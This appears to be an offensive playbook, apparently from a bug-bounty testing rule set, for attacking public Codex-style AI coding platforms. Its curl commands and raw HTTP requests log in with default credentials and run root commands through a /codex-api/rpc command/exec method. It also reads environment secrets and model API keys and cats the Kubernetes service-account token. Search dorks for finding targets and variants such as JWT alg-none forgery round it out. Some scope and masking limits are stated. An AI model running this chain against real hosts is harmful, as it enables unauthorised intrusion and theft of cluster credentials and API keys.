# Cloud IDE / Codex-style AI Coding Platforms: Weak Credentials → Root RCE → Credential Chain

> Type: authentication flaw + dangerous RPC + container/cluster credential chain  
> Whether to write up follows only `../rules/report-format.md`. Find quick-hits pointers by searching headings.

---

## Codex-style Coding Platform RPC (pointer in quick-hits)

Recognize: a public coding platform has `/tenant-api/login` + `/codex-api/rpc` (or similar tenant login + Codex RPC). This is not the chat bash-tool shot (see `agent-tool-exec-test.md`), nor the VS Code no-login-wall environ read (see `path-traversal-lfi-test.md`).

Hit: the current site. Get a session via the bare default credentials, then `command/exec` / `fs/*` / `env`. Try `meta/methods` without a Cookie too. Once recognized, only attack the current site; do not open new seeds to rescan the whole internet.

Counts as success: root and a hostname that looks like a persistent compute-plane Pod, plus the ability to read the cluster SA or a model key.

Dead ends: a wildcard-cert temporary instance that can be destroyed any time; login only with no RPC; the model only claims (verbally) it executed. A half chain (login only) keeps digging into RPC; it doesn't go into quick-hits as landed.

---

## 1. Pattern Profile (test when seen)

| Feature | Example |
|------|------|
| Domain/product | AI coding assistant, playbook, Codex-style console (not pinned to any one vendor) |
| Paths | `/tenant-api/login`, `/codex-api/rpc`, `/tenant-api/*` |
| Framework traces | OpenAI Codex, `@openai/codex`, thread/model RPC |
| Environment | dev / pre / fat / gray / sandbox (**scan publicly-exposed DEV first**, then find the production twin) |
| Default creds | the bare default accounts of this console shape (`admin/admin` and the like), **not** a dictionary for every site's login form |

**The chain in one line:**

```
Weak creds/unauthorized login → tenant session (JWT/Cookie)
  → POST /codex-api/rpc method=command/exec (root)
  → env / fs to read cluster SA + model API Key + invite code
  → quota burn / potential lateral movement / persistence
```

---

## 2. Minimal Probe Matrix (per candidate Host)

### 2.1 Fingerprint

```bash
# Login surface
curl -sk -o /dev/null -w "%{http_code}" -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'

# RPC surface (check the error shape without a Cookie too: 401 vs method not found vs pass-through)
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -d '{"method":"meta/methods","params":{}}'
```

Alive signals:
- login returns JSON (userId / session / wrong password) rather than a site-wide 405 HTML
- RPC returns JSON-RPC shape / methods list / a clear not-logged-in error
- the frontend title contains codex / playbook / coding platform

### 2.2 Weak Credentials (login)

Only hit the bare default accounts of this console shape on the **current site** (`../rules/engagement-guide.md` §4.1.1: a login-form dictionary isn't a mandatory step). One shot:

```bash
curl -sk -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' -D -
```

Common ones: `admin/admin`, `admin/123456`; if you have `TENANT_ADMIN_USERNAMES` / an invite code, use it as a key too. If there's no entry point or it's disproven, stop — don't grind through captchas.

Success: `Set-Cookie: tenant_session=...` or the body contains `userId` + admin identity.

### 2.3 RCE / Files / Meta-methods (after login)

```bash
# Method enumeration
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"meta/methods","params":{}}'

# Command execution (minimal proof: id / whoami / hostname)
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"command/exec","params":{"command":["id"]}}'

# List directory / read files
-d '{"method":"fs/readDirectory","params":{"path":"/"}}'
-d '{"method":"fs/readFile","params":{"path":"/etc/os-release"}}'

# Environment variables (secrets)
-d '{"method":"command/exec","params":{"command":["env"]}}'

# Cluster SA (if the container is in-cluster)
-d '{"method":"command/exec","params":{"command":["cat","/var/run/secrets/kubernetes.io/serviceaccount/token"]}}'
```

**Dangerous-method list (high value the moment one is hit):**

| method | Meaning |
|--------|------|
| `command/exec` | arbitrary commands |
| `fs/readFile` / `fs/writeFile` / `fs/remove` / `fs/readDirectory` | file system |
| `meta/methods` | capability-surface enumeration |
| `thread/start` / `model/list` | AI sessions and models (burns keys) |
| git-related RPC | repo read/write |

---

## 3. How to Make the Impact Proof Solid (SRC)

Evidence priority order:

1. **Root RCE**: `id` → `uid=0(root)` (minimal, reproducible)
2. **Environment and persistence**: a hostname that looks like a compute-plane Pod name ≠ a random temporary-sandbox label
3. **Secrets**: model `*_API_KEY` (report may mask the middle segment)
4. **Cluster**: `KUBERNETES_SERVICE_HOST` + readable SA token
5. **Invite code / admin username**: lets you register a persistent account
6. **RPC surface breadth**: 80+ methods; a snippet of the dangerous list suffices

**State the boundaries clearly:**
- whether it's public and unauthorized / weak-creds-only
- whether root, whether in-cluster
- whether the key can burn external model quota
- DEV vs production: if only DEV, state the environment in the report; finding a **prod twin** and hitting it too is more solid

**Dead ends, nailed again:** a wildcard-cert temporary instance that can be destroyed any time → not landed. Only a persistent compute plane + credential chain gets written up. A half chain (login only, no RPC) keeps being dug; it doesn't enter the table as landed.

---

## 4. How to Find Assets

**Only attack the current site.** Once `/tenant-api/login`, `/codex-api/rpc` are recognized, work §2 on this host; forbidden to open a new seed the moment you recognize the pattern or to rescan the whole internet with the same skin (opening in `../rules/iterating-shortlist.md`; one-seed closure in `../rules/engagement-guide.md`). Quality root domains only flow back into the queue; search again only after this seed's remaining live surface is exhausted.

The statements below are **only for when this task's current seed is already the Codex / coding-platform track** — to work through this seed's results, not to spin up another factory the moment a similar framework is recognized:

```
body="/codex-api/rpc" || body="/tenant-api/login"
body="codex-api" && body="tenant"
body="@openai/codex" || body="command/exec"
```

The `tenant-api`, `codex-api`, RPC methods, and invite codes in the current site's JS stay on this site's list; they are not used to open new seeds.

---

## 5. Isomorphic Variants (don't only know admin/admin)

1. **Zero-auth RPC**: `command/exec` / `meta/methods` directly without a Cookie
2. **Registration API + fixed invite code**: `TENANT_INVITE_CODE` hardcoded in env or the frontend
3. **Weak JWT secret / alg none**: forge `tenant_session` as admin
4. **WebSocket / another gateway**: same-origin Codex pushing commands over WS
5. **Same-seed sibling**: visit the `-dev` / production host only for a one-shot diff (upgrade only if a new path / changed response code appears). Forbidden to open a new seed to rescan the whole internet for this
6. **Multi-tenant isolation**: can a normal user's session also `command/exec` (vertical-privilege RCE)

---

## 6. Operational Discipline

- command execution only does **id / hostname / read-only cat of a specified path**; destructive writes, mining, and internal-network scanning/brute-forcing are forbidden
- when writing secrets into the report, mind the masking policy (if the platform requires the full value, paste it in full; otherwise mask the middle and state the length)
- don't stop at being able to upload/download; the value of this chain is **RCE + secrets + cluster**
- a half chain (login only, no RCE) keeps digging into RPC

---

## 7. Reference Skeleton (no live site)

| Item | Value |
|----|-----|
| Login | `POST /tenant-api/login` bare default creds → `tenant_session` |
| RCE | `POST /codex-api/rpc` `command/exec` → root |
| Environment | compute-plane Pod; cluster API on the internal network |
| Chain assets | model key, SA token, invite code, wide RPC |
| Write or not | follow only `../rules/report-format.md`. Whether DEV is accepted depends on the SRC's policy; a prod twin makes it more solid |

Reproduction skeleton (replace HOST / SESSION with the current site's actual values):

```http
POST /tenant-api/login HTTP/1.1
Host: HOST
Content-Type: application/json

{"username":"admin","password":"admin"}
```

```http
POST /codex-api/rpc HTTP/1.1
Host: HOST
Content-Type: application/json
Cookie: tenant_session=SESSION

{"method":"command/exec","params":{"command":["id"]}}
```

---

## 8. In One Line

**Public Codex-style coding platform: on the current site, first hit `/tenant-api/login` with bare default creds and the registration code, then hit `command/exec`+`fs/*`+`env` on `/codex-api/rpc`, closing the loop with root + cluster + API Key. Once recognized, only attack the current site, prioritizing the persistent production surface.**
